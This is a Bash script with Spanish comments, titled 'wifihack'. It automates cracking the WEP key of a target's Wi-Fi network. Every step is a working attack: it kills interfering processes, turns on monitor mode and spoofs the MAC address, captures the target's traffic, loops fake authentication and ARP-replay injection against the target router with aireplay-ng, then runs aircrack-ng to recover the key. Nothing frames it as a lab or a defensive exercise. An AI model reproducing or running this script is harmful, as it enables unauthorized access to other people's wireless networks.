#! /bin/bash
#Script wifihack por Alexander Botero (Redexel).
sudo rm -r /tmp/wifihack/
sudo mkdir /tmp/wifihack/
 
# PASO 0 - ELIMINAR LOS PROCESOS Y ACTIVAR EL DRIVER MONITOR:
sudo airmon-ng check kill
echo Interface:
read tarjeta
#sudo airmon-ng stop wlan0mon;
sudo airmon-ng start $tarjeta;
 
# PASO 0.1 - PONERME UNA MAC FALSA.
sudo ifconfig wlan0mon down;
sudo macchanger --mac=00:FA:BA:DA:CA:BE wlan0mon
sudo ifconfig wlan0mon up;
 
# PASO 1 - LISTAR LAS REDES WIFI:
xterm -title "Detectando wifi(Detener a petición)." -e sudo airodump-ng wlan0mon -w "/tmp/wifihack/wifiList";
cat /tmp/wifihack/wifiList-01.kismet.netxml | grep -e 'essid' -e 'BSSID'  -e 'channel' -e 'encryption' > /tmp/wifihack/wifis |
firefox "/tmp/wifihack/wifis";
 
# Un Wizar para preguntar:
j="n";
while test $j != "s"
do
clear;
echo Dime el canal del punto de acceso:
read canal
echo Dime la mac del router del objetivo:
read MAC_OBJETIVO
echo Dime el nombre de la wifi del objetivo:
read NOMBRE_AP
echo "¿Estás seguro de que lo has escrito bien (s/n)?"
read j
done
echo Vamos a empezar con el proceso.
 
# PASO 2 - PONER EL AIRODUMP:
xterm -hold  -title "Sniff...en la conexión del objetivo" -e sudo airodump-ng -c $canal -w /tmp/wifihack/captura wlan0mon &
 
# PASO 3 - HACERSE AMIGO DEL ROUTER DEL OBJETIVO:
# e inyectar algo de tráfico cada 5 segundos.
xterm -hold -title "Me estoy haciendo amigo del router del objetivo" -e "for (( i=0; i<=1000; i++ )) do sudo aireplay-ng -1 0 -a $MAC_OBJETIVO -h 00:FA:BA:DA:CA:BE -e $NOMBRE_AP wlan0mon; sleep 5; done" &
 
# PASO 4 - SNIFF ROUTER DEL OBJETIVO:
xterm -hold -title "Almacenando los datos de la conexion" -e sudo aireplay-ng -3 -b $MAC_OBJETIVO -h 00:FA:BA:DA:CA:BE wlan0mon &
 
# PASO 5 - OBTENER LA CLAVE A PARTIR DE LO QUE ESNIFAMOS:
xterm -hold -title "Pulsa una tecla para intentar crackear" -e "for (( i=0; i<=1000; i++ )) do read a; sudo aircrack-ng -a 1 -s /tmp/wifihack/captura-01.cap; done"
